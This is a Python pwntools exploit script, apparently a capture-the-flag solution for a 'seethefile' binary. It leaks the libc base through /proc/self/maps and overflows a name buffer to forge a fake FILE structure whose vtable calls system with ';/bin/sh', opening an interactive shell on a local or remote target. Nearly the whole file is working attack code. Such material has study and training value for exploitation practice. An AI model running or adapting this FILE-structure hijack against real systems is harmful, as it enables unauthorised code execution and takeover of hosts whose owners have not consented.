#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="debug")
localfile = "./origin_seethefile"
locallibc = "libc.so.6"
# locallibc = "/home/liu/src/how2heap/glibc_versions/2.23/i686_tcache/lib/libc-2.23.so"
pf      = lambda name,num           :log.info(name + ": 0x%x" % num)
g       = lambda x                  :next(libc.search(asm(x)))

def menu(idx):
    io.recvuntil("Your choice :")
    io.sendline(str(idx))

def open(filename):
    menu(1)
    io.recvuntil("What do you want to see :")
    io.sendline(filename)

def read():
    menu(2)

def close():
    menu(4)

def exit(name):
    menu(5)
    io.recvuntil("Leave your name :")
    io.sendline(name)

def exp():
    name_addr = 0x804B260
    open("/proc/self/maps")
    read()
    menu(3)
    read()
    menu(3)
    io.recvuntil("0 \n")
    libc_base = int(io.recv(8), 16)
    system_addr = libc_base + libc.sym["system"]

    pf("libc base", libc_base)
    payload  = b"A"*0x20 + p32(name_addr+0x30) + b"A"*0xc
    payload += b"\xff\xdf\xff\xff;/bin/sh\x00".ljust(0x94, b"\x00") + p32(name_addr+0x30+0x98)
    payload += p32(system_addr)*0x20
    
    # payload = b"\x11\x80\x11\x11;sh".ljust(8, b"\x00") + p32(system_addr)*6 + p32(name_addr) + p32(0)*28 + p32(name_addr)
    # gdb.attach(io, "b fclose")
    exit(payload)
    io.interactive()


argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

elf = ELF(localfile)
libc = ELF(locallibc)
exp()
